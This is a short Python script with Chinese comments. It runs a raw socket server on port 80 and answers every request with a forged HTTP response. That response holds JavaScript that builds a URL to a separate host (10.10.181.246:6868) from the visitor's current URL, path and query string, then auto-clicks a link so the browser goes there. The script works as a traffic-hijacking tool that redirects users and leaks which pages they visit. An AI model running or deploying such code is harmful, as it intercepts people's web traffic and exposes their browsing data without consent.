#coding: utf8
import socket
import threading
import time


def main():
    serv_sock = socket.socket()
    serv_sock.bind(('0.0.0.0', 80))
    serv_sock.listen(50)
    while True:
        cli_sock, _ = serv_sock.accept()

        # 设置TCP window size为1
        cli_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)

        # 关闭Nagle算法，立即发送数据
        cli_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

        cli_sock.sendall(b'''HTTP/1.1 200 Moved Temporarily\r\n'''
            b'''Content-Type: text/html\r\n'''
            b'''Content-Length: 425\r\n'''
            b'''Connection: close\r\n\r\n<html><head></head><body><a href="" id="hao123"></a><script type="text/javascript">var strU="http://10.10.181.246:6868/?u="+window.location+"&p="+window.location.pathname+window.location.search;hao123.href=strU;if(document.all){document.getElementById("hao123").click();}else {var e=document.createEvent("MouseEvents");e.initEvent("click",true,true);document.getElementById("hao123").dispatchEvent(e);}</script></body></html>''')

        def wait_second():
            time.sleep(1)  # 等待1秒钟，确保数据发送完毕
            cli_sock.close()

        threading.Thread(target=wait_second).start()


if __name__ == '__main__':
    main()
